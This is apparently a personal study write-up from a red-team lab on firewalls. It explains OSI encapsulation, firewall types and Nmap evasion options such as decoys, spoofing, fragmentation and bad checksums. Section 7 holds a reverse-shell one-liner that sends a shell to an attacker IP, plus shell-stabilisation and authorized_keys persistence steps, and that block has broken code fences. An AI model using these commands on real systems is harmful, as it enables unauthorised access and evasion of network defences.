---
title: "Firewalls"
date: 2026-10-27
weight: 17
---

## 1. Introduction
- A firewall is software or hardware that monitors and controls the traffic and compares it against a set of rules before passing or blocking it. One simple analogy is a guard at the entrance of an event. This gatekeeper can check the ID of indivuiduals against a set of rules before letting them enter (or leave)
- Before we go into more details about the firewalls, it is helpful to remember the contents of an IP packet and TCP segment. 
- To understand how the data changes forms across the OSI model, we only need to know core concept: **Encapsulation**
    - Think of it like nesting Russian dools. As data moves down layers, each layer wraps previous layer's data with its own specialized "header" (and sometime a footer).
    - The general rule of thumb is: **PDU (Protocol Data Unit) = Header + Payload**. PDU is a official term for every layer.
    - **Data Layers - 7,6,5**
        - At top 3, the network isnt started moving data yet. It just raw information created by your software, it can be text, images, etc
        - Layer7: Application (eg: HTTPS, DNS)
        - Layer6: Presentation (eg: SSL/TLS)
        - Layer5: Session (eg: RPC, NetBIOS - Managing the connection between the apps)
    - **The Transport Layer - 4**
        - This layer handles end to end communication, ensuring the data gets to correct application on receiving device.
        - Protocol: TCP, UDP, QUIC, ICMP etc
        - The Process: It takes raw data from above layer, and chops it into managable pieces. It slaps a **Transport Header**(containing source and destination ports) to each piece.
        - Data form: Segment for TCP, Datagram for UDP etc
        - Formula: **Segment = Transport Header + Data**
        - Below picture shows the TCP header structure:
        ![Transport Header](/resources_redteam/tcp_header.png)
        - Below picture depicts the simplified TCP state diagram
        ![TCP State Diagram](/resources_redteam/tcp_state_diagram.png)
        ```bash
        # little diversion
        # It took some for me to download a tcp stategram file and paste it here.
        # Intially it was svg, so I converted it to png using inkscape
        # Install Required Microsoft Fonts and clear font cache so system registers Ariel
        sudo apt install -y ttf-mscorefonts-installer
        sudo fc-cache -f -v
        # Convert using inkscape now white background
        sudo apt install inkscape
        inkscape tcp_state_diagram.svg --export-type=png --export-filename=tcp_state_diagram.png --export-dpi=300 --export-background=ffffff --export-background-opacity=1.0
        ```
    - **The Network Layer - 3**
        - This layer handles logical addressing and routing across different networks (The Internet).
        - Protocol: IP (IPv4, IPv6)
        - The Process: It takes entire **Segment** from transport layer, and treats it as a single piece of cargo. It wraps it in an **IP Header** (containing 14 fields), including source and destination IP addresses.
        - Data form: IP Packet
        - Formula: **IP Packet = IP Header + Data Segment**
        - Below picture shows the IP header (RFC 791), and observe its fields like Protocol, Source IP, and Destination IP.
        ![IP Header](/resources_redteam/ip_header.png)
    - **The Data Link Layer - 2**
        - This layer handles physical, local delivery between two directly connected devices (like laptop and wifi router).
        - Protocol: Ethernet, Wi-Fi (802.11), ATM, Frame Relay etc
        - The Process: This layer takes the packet from network layer, and puts it into a final wrapper. This layer is unique because it adds both a header at front (containing source and destination MAC addresses) and a trailer at the end (containing error-checking information).
        - Data Form: Frame
        - Devices Involved: Routers and Layer 3 switches
            - Responsibility: Packate Routing and Frame Re-packinging.
            - A Router recives Bits at layer 1, and converts them back into Layer 2 Frame.
            - A Router then open Frame, strips it away, and reads the Layer 3 IP packet header to look at the destination IP address.
            - Once it determines the next path, the router destroys the old frame, and builds a brand new Layer2 Frame with new MAC Address around the packet before converting it back into Bits to transmit.
        - Formula: **Frame = Frame Header + Packet + Frame Trailer**
        - Below picture shows the 802.11 frame structure:
        ![802.11 Frame](/resources_redteam/frame_80211.png)

    - **The Physical Layer - 1**
        - This layer handles the actual hardware transmission.
        - Medium Example: Ethernet cables, fiber optics, or radio waves.
        - The Process: The layer takes the Frame from Layer 2 and converts the entire structure into raw electrical, optical, or radio signals.
        - Data Form: Bits (1s and 0s).


- Questions:
    - Where the Port numbers fit in this model?
        - They lives outside of encryption: The application creates data, and presentation layer encrypts it. The Transport layer then chops this encrypted payload into chunks and slaps a Transport Header onto the outside.
        - The port numbers resie exclusively in this unencrypted Transport Header, and its visible to basic firewalls, and predict service being used.
    - How data reaches the destination?
        - Internet routers only look at the IP header, and use the destination IP address to forward the packet across the internet. (Layer 3)
        - Once the packet reaches the destination network, the Layer 2 switch uses the destination MAC address to forward the frame to the correct computer. (Layer 2)
        - The computer then checks the destination port number in the Transport Header to determine which application should receive the data. (Layer 4)
        - So, Routers, Switches, Devices only look at their respective layers.
        - Firewalls, on the other hand, look all visible layers.
        - Many Transport protocols does not use port numbers, like ICMP, which is used for ping and traceroute.


- For detailed explainations of firewall, please refer to [here](https://www.firewall.cx/networking/network-protocols/tcp-udp-protocol/tcp-source-destination-ports.html)


## 2. Types of Firewalls
- One way to classify firewalls would be wheter they are independent appliances.
    - **Hardware Firewall:** As name implies, an applience firewall is a seperate piece of hardware that the network traffic has to go through. Eg: Cisco ASA (Adaptive Security Appliance), WatchGuard Firebox, Netgate pfSense Plus appliance.
    - **Software Firewall:** This is piece of software that comes bundled with the OS, or you can install it as an additional service. MS windows has built-in firewall, **Windows Defender Firewall**, that runs along with the other OS services and user applications. Another example is **Linux IP tables** and **firewalld**.

- We can also classify firewall into:
    - **Personal firewall:** A personal firewall is designed to protect a single system or a small network. Most likely, you are using a personal firewall at home without paying much attention. For instance many wireless access points designed for homes have built-in firewall. 
    - **Commercial Firewall:** A commercia firewall protects medium to large networks. Consequently higher reliability and processing power, in addition to supporting a higher network bandwidth. Most likely you are going through firewal when acessing the internet within your university or company.

- From red team perspective, the most crucial classification would be based on the firewall inspection abilities. It is worth thinking about the firewall abilities in terms of the ISO/OSI layers based on their abilities, it is worthy of remembering that firewall focus on layer 3 and layer 4, to lesser extent to layer 2.
- Next generation firewalls are also designed to cover layer 5,6, 7. The more layers a firewall can inspect, the more sophisticated it gets and more processing power it needs.
- Based on firewall abilities, we can list the following firewall types:
    - **Packet Filtering Firewall:** It is themost basic type of firewall, it inspects the protocol, source IP, and destination IP, and ports in case of TCP,UDP datagrams. It is stateless inspection.
    - **Circuit-Level Gateway:** In addition to the features offered by the packet filtering firewalls, circuit level gateways can provide additional capabilities, such as checking TCP 3-way handshake against firewall rules.
    - **Statefull inspection firewall:** Compared to the previous types, this type of firewall gives an additional layer of protection as it keeps track of the established TCP sessions. As a result, it can detect and block any TCP packet outside an established TCP session.
    - **Proxy Firewall:** It is also referred to as APplication Firewall (AF) and We Application firewall (WAF). It is designated to masquerade as the original client and requests on its behalf. This process allows the proxy firewall to inspect instead of being limited to the packet headers. Generally speaking, this is used for web applications and does not work for all protocols.
    - **Next Generation Firewalls (NGFW):** It offers the highest firewall protection. It can monitor all the network layers, from OSI layer 2 to 7. It has application awareness and control. Eg: Juniper SRX series, Cisco Firepower.
    - **Cloud Firewall or Firewall as Service (FWaaS):** It replaces a hardware firewall in a cloud environment. Its features might be comparables to NGFW, depending on service provider, however, it benefits from scalability of cloud archecture. One example is Cloudflare Magic Firewall, Juniper Cloud Firewall, AWS WAF for web application protection, AWS Shield for DDoS protection.

## 3. Evasion via controlling Source MAC/IP/Port
- When scannig a host behind a firewall, the firewall will usually detect the block port scans. This situation would require you to adapt your network and port scan to evade the firewall.
- A network scanner like Nmap provides few features to help with such tasks.
    - Evasion via controlling the source MAC/IP/Port
    - Evasion via fragmentaion, MTU, data length
    - Evasion through modying header fields

- Nmap allow you to hide or spoof the source as you can use:
    - Decoy(s)
    - Proxy
    - Spoofed MAC address
    - Spoofed Source IP address
    - Fixed Source port number

- Before we elaborate on each approach, lets show what a nmap stealth (SYN) scan looks like. We scanning an MS Windows target (with default built-in firewall), so we added `-Pn` to force scan to proceed even if no ping reply received. `-Pn` is used to skip host discovery and testing whether the host is live. Morever to speed up the scan, we limited ourselves to the 100 most common ports using `-F` flag.
- The scan is perfomred using `nmap -sS -Pn -F <target_ip>`
- Wiresharek has captured the packets exchanged during the scan.
![nmap_stealth_scan](/resources_redteam/nmap_stealth_scan.png)


### 3.1 Decoy(s)
- Hide your scan with decoys.
- Using decoys makes your IP address mix with "decoy" IP address. Consequntly it will be difficult for firewall and target host know where the port scan is coming from. Morever, this can exhaust the blue team investigatin each source IP address.
- Using `-D` option, you can add decoy source IP address to confuse the target. Consider the following command `nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F <target_ip>`
![decoy](/resources_redteam/decoy_nmap.png)
- You can also set nmap to use random source IP address instead of explicitly specifying them. `nmap -sS -Pn -D RND,RND,ME -F <target_ip>`.

### 3.2 Proxy
- Use a HTTP/SOCKS4 proxy.
- Relaying the port scan via a proxy help keep your IP address unknown while target logs the IP address of the proxy.
- You can go this route using nmap option `--proxies PROXY_URL`.
- Example: `nmap -sS -Pn --proxies http://10.10.10.10:8080 -F <target_ip>` will send all of its packats via proxy server.


### 3.3 Spoofed MAC Address
- Spoof the source MAC address.
- Nmap allows you to specify your MAC address using the option `--spoof-mac <MAC_ADDRESS>`.
- This technique is tricky; spoofing the MAC address works only if your system is on the same network segment as the target host.
- The target system is going to reply to a spoofed MAC address. If you are not on the same network segment, sharing same Ethernet, you won't be able to capture and read the responses.
- Moreover, you can use this technique to hide your scanning activities on the network.

### 3.4 Spoofed IP Address
- Nmap lets you spoof your source IP address using the option `--spoof-ip <IP_ADDRESS>`.
- spoofing IP address is usefull if your system is on the same subnetwork as target host; otherwise, you won't be able to read the replies sent back. 
- The reason is that target host will reply to the spoofed IP address, and unless you can capture the responses, you wont benefit from this technique.
- Another use for spoofing IP address is when you control the system that has that particular IP address.
- Consequently if you notice that target started to block spoofed IP address, you can switch to a different spoofed IP address that belong to a system that you also control.
- This scanning technique to exploit trust relationships on the network based on IP addresses.



### 3.5 Fixed Source Port Number
- Scanning from one particular source port number can be helpful if you discover that the firewall allow incoming packets from particular source port number, such as port 53 or 80.
- Without inspecting the packet contents, packets from source TCP port 80 or 443 like packets from web server, while packets from UDP port 53 look like response to DNS queries. 
- We can set the source port number using the option `--source-port <PORT_NUMBER>`.

### 3.6 Final tabel

| Evasion Technique  | Nmap Argument |
|--------------------|---------------|
| Hide a scan with decoys | `-D <decoy1>,<decoy2>,<decoy3>,ME` |
| hdie a scan with random decoys | `-D RND,RND,RND,ME` |
| use an http/socks4 proxy to relay | `--proxies <proxy_url>` |
| spoof source IP address | `--spoof-ip <IP_ADDRESS>` |
| spoof source MAC address | `--spoof-mac <MAC_ADDRESS>` |
| use fixed source port number | `--source-port <PORT_NUMBER>` |



## 4. Evasion via Forcing fragmentation,MTU,Data Length
- We can control the packet size as it allows you to:
    - Fragment packets, optionally with given MTU. If the firewall, or the IDS/IPS, does not reassemble the packet, it will most likely let it pass. Consequently, the target system will reassemble and process it.
    - Send packets with specific data lengths.

### 4.1 Fragment your packets with 8 bytes of data.
- One easy way to fragment your packets would be to use the `-f` option. This option will fragment the IP packet to carry only 8 bytes of data. 
- As mentioned earlier, running TCP port scan means that IP packet will hold 24 bytes of data i.e TCP header.
- If you want to limit the IP data size to 8 bytes, the 24 bytes of the TCP header will divided across the 3 IP packets. 
- And this is precisely what we obtained when we ran this Nmap scan `nmap -sS -Pn -f -F <TARGET_IP>`.
![Fragmented Packets](/resources_redteam/fragmentation.png)


### 4.2 Fragment Packets with 16 bytes of data
- Another handy option is the `-ff`, limiting the IP data 16 bytes. 
- By running `nmap -sS -Pn -ff -F <target_ip>`, we expect 24 byetes of TCP header to be divided between IP packets, 16+8.


### 4.3 Fragment Packets According to a Set MTU
- Another neat way to fragment packets is by setting the MTU. 
- In Nmap, `--mtu <MTU_VALUE>` specify the number of bytes per IP packet. IN other words, the IP header size is not included. The value set for MTU must always be a multiple of 8.
- Note that Maximum Transmission Unit (MTU) indicates the maximum packet size that can pass on a certain link layer connection. For instance, Ethernet has an MTU of 1500, meaning that larget IP packet that can be sent over an ethernet (link layer) connection is 1500 bytes. Please dont confuse this MTU with `--mtu`
- Running Nmap `--mtu 8` will be identical to `-f` as both will fragment the IP packet to carry only 8 bytes of data.

### 4.4 Generate Packets with specific length
- In some instances, you might find out that size of packets is triggering the firewall or IDS/IPS to detect and block you. If you ever find yourself in such a situation, you can make your port scanning more evasive by setting a specific IP packet length using `--data-lenght <LENGTH>`.
- Again, remember that length should be a multiple of 8.
- If you run the following Nmap scan `nmap -sS -Pn --data-length 64 <target_ip>`, each tcp segment will be padded with random data till its length is 64 bytes. 


## 5. Evasion via Modifying Header fields
- Nmap allows you to control various header fields that might help evade the firewall.
    - set IP time-to-live
    - send packets with the specified IP options
    - send packets with a wrong TCP/UDP checksum.

### 5.1 Set TTL
- Nmap gives further control over the different fields in the IP header. One of the fields you can control is the TTL. Nmap options include `--ttl <value>` to set the TTL to a custom value.
- This might be usefull if you think default TTL exposes your port scan activities.
- In the following screenshot, we can see the packets captured by wireshark after using a custom TTL as we run our scan, `nmap -sS -Pn --ttl 81 -F <target_ip>`.
- As with the previous examples, the packets below are caputred on the same system running Nmap.



### 5.2 Set IP Options
- One of the IP header fields is the IP options. Nmap lets you control the value set  in Options field using `--ip-options HEX_STRING`, where hex string can specify the bytes you want to use to fill in the IP Options field. Each bytes is written as `\xHH` where HH represents two hexadecimal digits, i.e., byte.
- A shortcut provided by nmap is using the letters to make your requests
    - `R` to record-route
    - `T` to record-timestamp
    - `U` to record-route and record-timestamp
    - `L` for loose source routing and needs to be followed by a list of IP address seperated by space.
    - `S` for strict routing and needs to be followed by a list of IP addresses seperated by space.

- the loose and strict routing can be helpful if you want to try to make your packets take a particular route to avoid a specific security system.

### 5.3 Wrong checksum
- Another trick you can use is to send your packets with an intentionally wrong checksum. Some systems would drop a packet with a bad checksum, while others wont. You can use this to your advantage to discover more about the systsms in your network. All you need to do is add option `--badsum` to your nmap command.
- Using `nmap -sS -Pn --badsum -F <target_ip>`, we scanned our target intentionally incorrect TCP checksum. The target dropped all our packets and didnt respond to any of them.


## 6. Evasion Using Port hopping
- 3 common firewall evasion techniques are:
    - Port hopping
    - Port tunneling
    - Use of non-standard ports
- Port hopping is a technique where an application hops from on port to another till can establish and maintain a connection. In other words, the application might try different ports till it can successfully establish connection.  Some "legitimate" applications use this technique to evade firewalls. 
- there is another type of port hopping where applicatin establishes the connection on one port and starts transmitting some data; after a while, it establishes a new connection on different port and resumes sending more data. The purpose is to make it more difficult for the blue team to detect and track all the exchanged traffic.

## 7. Evasion using port tunneling
- Port tunneling is also known as port forwarding and port mapping. In simple terms, this technique forwards the packets sent to one destination port to another destination port. For instance, packets sent to port 80 on one system are forwards to port 8080 on another system.
- Consider the case where you have a server behind the firewall that you cant access from the outside. HOwever you discvored that firewall does not block specific port. You can use this knowledge to your advantage by tunneling the traffic via different port.
- Lets port 443 is open on server, and we want to use teh SMTP server within from outside. `nc -lvnp 443 -c "nc <target_ip> 25"`
![port tunneling](/resources_redteam/port_tunnelling.png)

- We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.
```bash
#attacker machine
sudo nmap -lvnp 443
# you will cat the revershell here once you execute the payload in web at 8080
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm-256color
stty --all #check the rows and colums config in our machine, and set the same here in revershell
stty rows 20 columns 127
Ctrl+Z
stty raw -echo; fg
mkdir -p ~/.ssh; echo "your generated key-pars's public key" > ~/.ssh/authorized_keys
# now from your attacker machine's shell, try to ssh 
ssh -i <private_key_file_path> thmredteam@10.49.137.191
curl http://localhost # this will give you the flag
```


# victim remote shell
mkfifo /tmp/f; ncat <attacker_ip> 443  < /tmp/f | /bin/sh > /tmp/f 2>&1; rm -rf /tmp/f
```


## 8. Next Generation firewalls
- Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. 
- In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.

- Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:

    - Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.
    - Identify users and their traffic. It can enforce the security policy per-user or per-group basis.
    - Identify the applications and protocols regardless of the port number being used.
    - Identify the content being transmitted. It can enforce the security policy in case any violating content is detected.
    - Ability to decrypt SSL/TLS and SSH traffic. For instance, it restricts evasive techniques built around encryption to transfer malicious files.
- A properly configured and deployed NGFW renders many attacks useless.










































